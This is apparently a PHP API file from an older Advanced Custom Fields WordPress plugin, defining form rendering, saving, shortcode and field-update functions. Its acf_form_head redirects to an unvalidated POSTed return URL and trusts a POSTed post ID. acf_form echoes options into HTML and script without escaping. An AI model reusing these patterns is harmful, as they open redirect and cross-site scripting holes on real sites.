function api_acf_field_group_get_options( $options, $post_id )
{
	// validate
	if( !empty($GLOBALS['acf_register_field_group']) )
	{
		foreach( $GLOBALS['acf_register_field_group'] as $acf )
		{
			if( $acf['id'] == $post_id )
			{
				$options = $acf['options'];
				break;
			}
		}
	}

	return $options;
}


/*
*  get_row_layout()
*
*  This function will return a string representation of the current row layout within a 'has_sub_field' loop
*
*  @type	function
*  @since	3.0.6
*  @date	29/01/13
*
*  @return	$value - string containing the layout
*/

function get_row_layout()
{
	// vars
	$value = get_sub_field('acf_fc_layout');
	
	
	return $value;
}


/*
*  acf_shortcode()
*
*  This function is used to add basic shortcode support for the ACF plugin
*
*  @type	function
*  @since	1.1.1
*  @date	29/01/13
*
*  @param	array	$atts: an array holding the shortcode options
*			string	+ field: the field name
*			mixed	+ post_id: the post_id to load from
*
*  @return	string	$value: the value found by get_field
*/

function acf_shortcode( $atts )
{
	// extract attributs
	extract( shortcode_atts( array(
		'field' => "",
		'post_id' => false,
	), $atts ) );
	
	
	// $field is requird
	if( !$field || $field == "" )
	{
		return "";
	}
	
	
	// get value and return it
	$value = get_field( $field, $post_id );
	
	
	if( is_array($value) )
	{
		$value = @implode( ', ',$value );
	}
	
	return $value;
}
add_shortcode( 'acf', 'acf_shortcode' );


/*
*  acf_form_head()
*
*  This function is placed at the very top of a template (before any HTML is rendered) and saves the $_POST data sent by acf_form.
*
*  @type	function
*  @since	1.1.4
*  @date	29/01/13
*
*  @param	N/A
*
*  @return	N/A
*/

function acf_form_head()
{
	// global vars
	global $post_id;
	
	
	// verify nonce
	if( isset($_POST['acf_nonce']) && wp_verify_nonce($_POST['acf_nonce'], 'input') )
	{
		// $post_id to save against
		$post_id = $_POST['post_id'];
		
		
		// allow for custom save
		$post_id = apply_filters('acf/pre_save_post', $post_id);
		
		
		// save the data
		do_action('acf/save_post', $post_id);	


		// redirect
		if(isset($_POST['return']))
		{
			wp_redirect($_POST['return']);
			exit;
		}
	}
	
	
	// need wp styling
	wp_enqueue_style(array(
		'colors-fresh'
	));
	
		
	// actions
	do_action('acf/input/admin_enqueue_scripts');

	add_action('wp_head', 'acf_form_wp_head');
	
}

function acf_form_wp_head()
{
	do_action('acf/input/admin_head');
}


/*
*  acf_form()
*
*  This function is used to create an ACF form.
*
*  @type	function
*  @since	1.1.4
*  @date	29/01/13
*
*  @param	array		$options: an array containing many options to customize the form
*			string		+ post_id: post id to get field groups from and save data to. Default is false
*			array		+ field_groups: an array containing field group ID's. If this option is set, 
*						  the post_id will not be used to dynamically find the field groups
*			boolean		+ form: display the form tag or not. Defaults to true
*			array		+ form_attributes: an array containg attributes which will be added into the form tag
*			string		+ return: the return URL
*			string		+ html_before_fields: html inside form before fields
*			string		+ html_after_fields: html inside form after fields
*			string		+ submit_value: value of submit button
*			string		+ updated_message: default updated message. Can be false					 
*
*  @return	N/A
*/

function acf_form( $options = array() )
{
	global $post;
	
	
	// defaults
	$defaults = array(
		'post_id' => false,
		'field_groups' => array(),
		'form' => true,
		'form_attributes' => array(
			'id' => 'post',
			'class' => '',
			'action' => '',
			'method' => 'post',
		),
		'return' => add_query_arg( 'updated', 'true', get_permalink() ),
		'html_before_fields' => '',
		'html_after_fields' => '',
		'submit_value' => __("Update", 'acf'),
		'updated_message' => __("Post updated", 'acf'), 
	);
	
	
	// merge defaults with options
	$options = array_merge($defaults, $options);
	
	
	// merge sub arrays
	foreach( $options as $k => $v )
	{
		if( is_array($v) )
		{
			$options[ $k ] = array_merge($defaults[ $k ], $options[ $k ]);
		}
	}
	
	
	// filter post_id
	$options['post_id'] = apply_filters('acf/get_post_id', $options['post_id'] );
	
	
	// attributes
	$options['form_attributes']['class'] .= 'acf-form';
	
	
	
	// register post box
	if( empty($options['field_groups']) )
	{
		// get field groups
		$filter = array(
			'post_id' => $options['post_id']
		);
		
		
		if( strpos($options['post_id'], 'user_') !== false )
		{
			$user_id = str_replace('user_', '', $options['post_id']);
			$filter = array(
				'ef_user' => $user_id
			);
		}
		elseif( strpos($options['post_id'], 'taxonomy_') !== false )
		{
			$taxonomy_id = str_replace('taxonomy_', '', $options['post_id']);
			$filter = array(
				'ef_taxonomy' => $taxonomy_id
			);
		}
		
		
		$options['field_groups'] = array();
		$options['field_groups'] = apply_filters( 'acf/location/match_field_groups', $options['field_groups'], $filter );
	}


	// updated message
	if(isset($_GET['updated']) && $_GET['updated'] == 'true' && $options['updated_message'])
	{
		echo '<div id="message" class="updated"><p>' . $options['updated_message'] . '</p></div>';
	}
	
	
	// display form
	if( $options['form'] ): ?>
	<form <?php if($options['form_attributes']){foreach($options['form_attributes'] as $k => $v){echo $k . '="' . $v .'" '; }} ?>>
	<?php endif; ?>
	
	<div style="display:none">
		<script type="text/javascript">
			acf.o.post_id = <?php echo is_numeric($options['post_id']) ? $options['post_id'] : '"' . $options['post_id'] . '"'; ?>;
		</script>
		<input type="hidden" name="acf_nonce" value="<?php echo wp_create_nonce( 'input' ); ?>" />
		<input type="hidden" name="post_id" value="<?php echo $options['post_id']; ?>" />
		<input type="hidden" name="return" value="<?php echo $options['return']; ?>" />
		<?php wp_editor('', 'acf_settings'); ?>
	</div>
	
	<div id="poststuff">
	<?php
	
	// html before fields
	echo $options['html_before_fields'];
	
	
	$acfs = apply_filters('acf/get_field_groups', array());
	
	if( is_array($acfs) ){ foreach( $acfs as $acf ){
		
		// only add the chosen field groups
		if( !in_array( $acf['id'], $options['field_groups'] ) )
		{
			continue;
		}
		
		
		// load options
		$acf['options'] = apply_filters('acf/field_group/get_options', array(), $acf['id']);
		
		
		// load fields
		$fields = apply_filters('acf/field_group/get_fields', array(), $acf['id']);
		
		
		echo '<div id="acf_' . $acf['id'] . '" class="postbox acf_postbox ' . $acf['options']['layout'] . '">';
		echo '<h3 class="hndle"><span>' . $acf['title'] . '</span></h3>';
		echo '<div class="inside">';
							
		do_action('acf/create_fields', $fields, $options['post_id']);
		
		echo '</div></div>';
		
	}}
	
	
	// html after fields
	echo $options['html_after_fields'];
	
	?>
	
	<?php if( $options['form'] ): ?>
	<!-- Submit -->
	<div class="field">
		<input type="submit" value="<?php echo $options['submit_value']; ?>" />
	</div>
	<!-- / Submit -->
	<?php endif; ?>
	
	</div><!-- <div id="poststuff"> -->
	
	<?php if( $options['form'] ): ?>
	</form>
	<?php endif;
}


/*
*  update_field()
*
*  This function will update a value in the database
*
*  @type	function
*  @since	3.1.9
*  @date	29/01/13
*
*  @param	mixed	$field_name: the name of the field - 'sub_heading'
*  @param	mixed	$value: the value to save in the database. The variable type is dependant on the field type
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	N/A
*/

function update_field( $field_key, $value, $post_id = false )
{
	// filter post_id
	$post_id = apply_filters('acf/get_post_id', $post_id );
	
	
	// vars
	$options = array(
		'load_value' => false,
		'format_value' => false
	);
	
	$field = get_field_object( $field_key, $post_id, $options);

	
	// sub fields? They need formatted data
	if( $field['type'] == 'repeater' )
	{
		$value = acf_convert_field_names_to_keys( $value, $field );
	}
	elseif( $field['type'] == 'flexible_content' )
	{
		if( $field['layouts'] )
		{
			foreach( $field['layouts'] as $layout )
			{
				$value = acf_convert_field_names_to_keys( $value, $layout );
			}
		}
	}
	
	
	// save
	do_action('acf/update_value', $value, $post_id, $field );
	
	
	return true;
	
}


/*
*  delete_field()
*
*  This function will remove a value from the database
*
*  @type	function
*  @since	3.1.9
*  @date	29/01/13
*
*  @param	mixed	$field_name: the name of the field - 'sub_heading'
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	N/A
*/

function delete_field( $field_name, $post_id )
{
	do_action('acf/delete_value', $post_id, $field_name );
}


/*
*  create_field()
*
*  This function will creat the HTML for a field
*
*  @type	function
*  @since	4.0.0
*  @date	17/03/13
*
*  @param	array	$field - an array containing all the field attributes
*
*  @return	N/A
*/

function create_field( $field )
{
	do_action('acf/create_field', $field );
}


/*
*  acf_convert_field_names_to_keys()
*
*  Helper for the update_field function
*
*  @type	function
*  @since	4.0.0
*  @date	17/03/13
*
*  @param	array	$value: the value returned via get_field
*  @param	array	$field: the field or layout to find sub fields from
*
*  @return	N/A
*/

function acf_convert_field_names_to_keys( $value, $field )
{
	// only if $field has sub fields
	if( !isset($field['sub_fields']) )
	{
		return $value;
	}
	

	// define sub field keys
	$sub_fields = array();
	if( $field['sub_fields'] )
	{
		foreach( $field['sub_fields'] as $sub_field )
		{
			$sub_fields[ $sub_field['name'] ] = $sub_field;
		}
	}
	
	
	// loop through the values and format the array to use sub field keys
	if( is_array($value) )
	{
		foreach( $value as $row_i => $row)
		{
			if( $row )
			{
				foreach( $row as $sub_field_name => $sub_field_value )
				{
					// sub field must exist!
					if( !isset($sub_fields[ $sub_field_name ]) )
					{
						continue;
					}
					
					
					// vars
					$sub_field = $sub_fields[ $sub_field_name ];
					$sub_field_value = acf_convert_field_names_to_keys( $sub_field_value, $sub_field );
					
					
					// set new value
					$value[$row_i][ $sub_field['key'] ] = $sub_field_value;
					
					
					// unset old value
					unset( $value[$row_i][$sub_field_name] );
						
					
				}
				// foreach( $row as $sub_field_name => $sub_field_value )
			}
			// if( $row )
		}
		// foreach( $value as $row_i => $row)
	}
	// if( $value )
	
	
	return $value;

}


/*
*  acf_force_type_array
*
*  This function will force a variable to become an array
*
*  @type	function
*  @date	4/02/2014
*  @since	5.0.0
*
*  @param	$var (mixed)
*  @return	(array)
*/

function acf_force_type_array( $var ) {
	
	// is array?
	if( is_array($var) ) {
	
		return $var;
	
	}
	
	
	// bail early if empty
	if( empty($var) && !is_numeric($var) ) {
		
		return array();
		
	}
	
	
	// string 
	if( is_string($var) ) {
		
		return explode(',', $var);
		
	}
	
	
	// place in array
	return array( $var );
} 


/*
*  acf_get_valid_terms
*
*  This function will replace old terms with new split term ids
*
*  @type	function
*  @date	27/02/2015
*  @since	5.1.5
*
*  @param	$terms (int|array)
*  @param	$taxonomy (string)
*  @return	$terms
*/

function acf_get_valid_terms( $terms = false, $taxonomy = 'category' ) {
	
	// bail early if function does not yet exist or
	if( !function_exists('wp_get_split_term') || empty($terms) ) {
		
		return $terms;
		
	}
	
	
	// vars
	$is_array = is_array($terms);
	
	
	// force into array
	$terms = acf_force_type_array( $terms );
	
	
	// force ints
	$terms = array_map('intval', $terms);
	
	
	// attempt to find new terms
	foreach( $terms as $i => $term_id ) {
		
		$new_term_id = wp_get_split_term($term_id, $taxonomy);
		
		if( $new_term_id ) {
			
			$terms[ $i ] = $new_term_id;
			
		}
		
	}
	
	
	// revert array if needed
	if( !$is_array ) {
		
		$terms = $terms[0];
		
	}
	
	
	// return
	return $terms;
	
}


/*
*  Depreceated Functions
*
*  @description: 
*  @created: 23/07/12
*/


/*--------------------------------------------------------------------------------------
*
*	reset_the_repeater_field
*
*	@author Elliot Condon
*	@depreciated: 3.3.4 - now use has_sub_field
*	@since 1.0.3
* 
*-------------------------------------------------------------------------------------*/

function reset_the_repeater_field()
{
	// do nothing
}


/*--------------------------------------------------------------------------------------
*
*	the_repeater_field
*
*	@author Elliot Condon
*	@depreciated: 3.3.4 - now use has_sub_field
*	@since 1.0.3
* 
*-------------------------------------------------------------------------------------*/

function the_repeater_field($field_name, $post_id = false)
{
	return has_sub_field($field_name, $post_id);
}


/*--------------------------------------------------------------------------------------
*
*	the_flexible_field
*
*	@author Elliot Condon
*	@depreciated: 3.3.4 - now use has_sub_field
*	@since 3.?.?
* 
*-------------------------------------------------------------------------------------*/

function the_flexible_field($field_name, $post_id = false)
{
	return has_sub_field($field_name, $post_id);
}

/*
*  acf_filter_post_id()
*
*  This is a deprecated function which is now run through a filter
*
*  @type	function
*  @since	3.6
*  @date	29/01/13
*
*  @param	mixed	$post_id
*
*  @return	mixed	$post_id
*/

function acf_filter_post_id( $post_id )
{
	return apply_filters('acf/get_post_id', $post_id );
}

?>